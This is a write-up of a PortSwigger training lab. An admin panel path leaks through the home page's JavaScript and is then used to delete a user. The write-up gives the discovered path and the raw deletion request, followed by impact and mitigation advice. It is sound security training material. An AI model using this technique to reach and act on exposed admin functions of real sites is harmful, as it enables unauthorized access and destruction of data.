# Unprotected admin functionality with unpredictable URL

**Source:** [PortSwigger](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url)   
**Category:** Access control  
**Difficulty:** APPRENTICE

## Objective
Solve the lab by accessing the admin panel, and using it to delete the user carlos.

## Vulnerability
This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

## Exploitation

### Steps

1. Opened the application in Burp Suite and intercepted the request for the home page.

2. The response contained JavaScript revealing the admin panel path:

```js
adminPanelTag.setAttribute('href', '/admin-c796cy');
```

3. Opened `/admin-c796cy` in the browser, successfully accessed the admin panel, and deleted the user `carlos`.

### Payload

Discovered JavaScript:

```js
adminPanelTag.setAttribute('href', '/admin-c796cy');
```

Discovered admin panel:

```text
/admin-c796cy
```

Delete user request:

```http
GET /admin-c796cy/delete?username=carlos HTTP/2
```

### Shortcut

1. Intercept the home page response.
2. Find the hidden admin panel URL in the JavaScript source.
3. Open the admin panel and delete the `carlos` user.

## Impact

An attacker can discover and access administrative functionality without authentication if sensitive endpoints are exposed in client-side code. This can lead to unauthorized administrative actions such as deleting users or modifying application data.

## Mitigation

Protect administrative functionality with proper authentication and authorization instead of relying on hidden or unpredictable URLs.

Additional protections:
- Do not expose sensitive endpoints in client-side JavaScript.
- Enforce server-side access control checks on every administrative request.
- Implement role-based access control (RBAC).
- Regularly review client-side code for information disclosure.

## Tools
- Burp Suite

## Notes

This lab demonstrates that unpredictable URLs are not an effective security control. Even if an administrative endpoint is difficult to guess, exposing it in client-side JavaScript allows an attacker to discover it and access privileged functionality if proper authorization checks are missing.